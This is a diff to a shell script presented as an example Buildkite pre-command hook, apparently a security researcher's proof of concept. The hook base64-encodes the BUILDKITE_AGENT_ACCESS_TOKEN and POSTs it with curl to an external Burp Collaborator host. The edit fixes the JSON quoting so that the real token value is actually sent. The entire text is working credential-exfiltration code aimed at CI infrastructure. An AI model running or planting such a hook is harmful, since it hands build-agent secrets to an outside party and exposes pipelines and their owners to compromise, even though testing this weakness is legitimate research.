@@ -2,4 +2,4 @@ echo "This is an example of a pre-command hook from .buildkite/hooks/pre-command
 echo "exfiltrating BUILDKITE_AGENT_ACCESS_TOKEN"
 TOKEN=$(echo $BUILDKITE_AGENT_ACCESS_TOKEN | base64 -w 0)
 echo $TOKEN
-curl -X POST exfil.jtglx0umljvnaxnpfm77zbr7vy1ppfd4.burpcollaborator.elttam.au -d '{"tok":"$TOKEN"}'
+curl -X POST exfil.jtglx0umljvnaxnpfm77zbr7vy1ppfd4.burpcollaborator.elttam.au -d "{\"tok\":\"$TOKEN\"}"
